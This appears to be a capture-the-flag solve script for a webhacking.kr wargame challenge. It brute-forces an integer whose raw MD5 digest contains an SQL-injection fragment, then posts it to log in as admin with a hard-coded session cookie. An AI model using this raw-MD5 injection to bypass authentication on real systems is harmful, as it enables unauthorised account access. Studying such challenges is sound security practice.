import requests

url='http://webhacking.kr/challenge/bonus/bonus-13/index.php'
cookies={'PHPSESSID':'1gvdu8mjh0miihv90idtg3djj3'}
"""
import hashlib
for i in xrange(1,10000000):
	text=hashlib.md5(str(i)).digest() # md5($i,true)
	if "'='" in text:
		print i
"""


payload={'id':'admin', 'pw':'1839431'}#admin', 'pw':'123'}
response=requests.post(url, data=payload,  cookies=cookies)
print response.text

